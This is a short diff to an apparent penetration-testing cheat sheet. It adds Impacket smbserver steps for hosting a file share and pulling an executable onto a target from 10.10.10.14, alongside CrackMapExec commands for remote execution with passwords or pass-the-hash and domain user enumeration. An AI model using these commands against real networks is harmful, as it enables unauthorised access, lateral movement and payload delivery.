@@ -43,6 +43,11 @@ CrackMapExec
   crackmapexec IP -u username -p='password' (--exec-method smbexec) -X 'powershell cmd'
     - Default exec-method is wmiexec; smbexec will drop as System and wmiexec as user/admin
   crackmapexec IP -u username -H hash
+  
+Impacket
+  SMB Share
+    smbserver.py sharename -smb2support directory path (ie. python smbserver.py -smb2support poop /tmp)
+      - copy files: xcopy \\10.10.10.14\poop\filename.exe
 
 Net Commands
   shell net user username /domain (query domain user)
